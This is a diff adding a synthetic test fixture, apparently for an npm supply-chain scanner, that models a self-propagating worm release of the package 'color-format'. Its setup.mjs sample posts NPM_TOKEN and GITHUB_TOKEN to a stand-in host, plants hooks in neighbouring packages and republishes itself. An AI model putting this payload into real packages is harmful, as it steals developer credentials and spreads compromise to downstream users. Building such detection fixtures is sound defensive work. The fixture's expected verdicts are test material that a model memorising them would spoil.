@@ -1,0 +1,62 @@
+{
+  "id": "npm-install-hook-worm-propagation",
+  "title": "Preinstall hook harvests credentials, hooks neighbouring packages, and republishes itself",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "provenance": "Composite of the npm registry worms that publish through a real CI identity: the source tree gains a preinstall hook and payload file, the build attests it honestly, and the payload's last step is publishing again. Defanged: example.invalid endpoint, env names only, no real credential, no reachable registry.",
+  "intent": "The full carrier shape in one release delta, ending in the step that makes it a worm rather than a dropper. Exercises the install-script, credential/network capability, and propagation families together.",
+  "expectMinRisk": "critical",
+  "expectAnyRule": ["propagation.registry-publish", "propagation.package-mutation"],
+  "previousPackageJson": {
+    "name": "color-format",
+    "version": "6.0.0"
+  },
+  "stagedPackageJson": {
+    "name": "color-format",
+    "version": "6.1.0",
+    "scripts": {
+      "preinstall": "node setup.mjs"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 41,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"color-format\",\"version\":\"6.0.0\"}"
+    },
+    {
+      "path": "index.js",
+      "size": 38,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./format');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 83,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"color-format\",\"version\":\"6.1.0\",\"scripts\":{\"preinstall\":\"node setup.mjs\"}}"
+    },
+    {
+      "path": "index.js",
+      "size": 38,
+      "sha256": "index-js",
+      "flags": [],
+      "textSample": "module.exports = require('./format');\n"
+    },
+    {
+      "path": "setup.mjs",
+      "size": 658,
+      "sha256": "setup-mjs",
+      "flags": [],
+      "textSample": "import { execSync } from 'node:child_process';\nimport { readdirSync, writeFileSync } from 'node:fs';\nimport https from 'node:https';\n// 1. take the install-time credentials\nconst loot = { npm: process.env.NPM_TOKEN, gh: process.env.GITHUB_TOKEN };\nhttps.request('https://example.invalid/ingest', { method: 'POST' }).end(JSON.stringify(loot));\n// 2. hook the packages already unpacked next to us\nfor (const name of readdirSync('../node_modules')) {\n  writeFileSync(`../node_modules/${name}/.hook.js`, 'require(\"color-format/setup.mjs\")');\n}\n// 3. mint new carrier versions with the stolen credential\nexecSync('npm publish --tag latest', { stdio: 'ignore' });\n"
+    }
+  ]
+}
